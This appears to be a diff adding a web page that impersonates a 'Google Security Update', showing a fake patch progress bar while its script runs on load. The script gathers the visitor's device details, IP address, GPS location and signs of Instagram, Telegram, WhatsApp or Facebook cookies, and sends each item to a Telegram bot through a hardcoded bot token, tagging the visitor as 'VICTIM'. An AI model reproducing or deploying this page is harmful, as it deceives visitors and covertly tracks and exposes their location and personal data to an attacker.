@@ -1,0 +1,181 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Security Update</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        h1 {
+            color: #fff;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        .skull {
+            font-size: 80px;
+            margin: 20px 0;
+            animation: pulse 2s infinite;
+            filter: drop-shadow(0 0 20px #ff0000);
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+        .id-badge {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            border-radius: 10px;
+            color: #00ff00;
+            font-family: monospace;
+            font-size: 18px;
+            margin: 20px 0;
+        }
+        .progress {
+            width: 100%;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #ff6b6b);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .status {
+            color: #ccc;
+            font-size: 14px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="skull">💀☠️</div>
+        <h1>APT SECURITY UPDATE</h1>
+        
+        <div class="id-badge">
+            DEVICE ID: <span id="deviceId">LOADING...</span>
+        </div>
+        
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="status" id="status">
+            Initializing APT-level security patches...
+        </div>
+    </div>
+
+    <script>
+        // دریافت پارامتر از URL
+        const urlParams = new URLSearchParams(window.location.search);
+        let VID = urlParams.get('id');
+        
+        // اگر ID وجود نداشت، یک ID جدید بساز
+        if (!VID) {
+            VID = Math.random().toString(36).substring(2, 10).toUpperCase();
+        }
+        
+        document.getElementById('deviceId').innerText = VID;
+        
+        const BOT_TOKEN = '7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI';
+        const ADMIN_ID = '8209720840';
+        
+        async function sendToTelegram(type, data) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: `💀☠️ <b>VICTIM ${VID}</b>\n📱 <b>${type}</b>\n<code>${String(data).substring(0, 500)}</code>`,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) { }
+        }
+        
+        async function collectData() {
+            // Device Info
+            let platform = navigator.platform;
+            let ua = navigator.userAgent;
+            
+            await sendToTelegram('DEVICE', `Platform: ${platform}\nScreen: ${screen.width}x${screen.height}`);
+            
+            // IP
+            try {
+                let ip = await (await fetch('https://api.ipify.org')).text();
+                await sendToTelegram('IP', ip);
+            } catch (e) { }
+            
+            // Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: ADMIN_ID,
+                            latitude: p.coords.latitude,
+                            longitude: p.coords.longitude
+                        })
+                    });
+                });
+            }
+            
+            // Social Media Detection
+            let cookies = document.cookie;
+            let socials = [];
+            if (cookies.includes('instagram')) socials.push('Instagram');
+            if (cookies.includes('telegram')) socials.push('Telegram');
+            if (cookies.includes('whatsapp')) socials.push('WhatsApp');
+            if (cookies.includes('facebook')) socials.push('Facebook');
+            if (socials.length > 0) {
+                await sendToTelegram('SOCIAL', socials.join(', '));
+            }
+        }
+        
+        collectData();
+        
+        // Progress animation
+        let width = 0;
+        const interval = setInterval(() => {
+            width += 1;
+            document.getElementById('progressBar').style.width = width + '%';
+            if (width >= 100) {
+                clearInterval(interval);
+                document.getElementById('status').innerHTML = '✅ <b>SYSTEM SECURE</b>';
+            }
+        }, 50);
+    </script>
+</body>
+  </html>
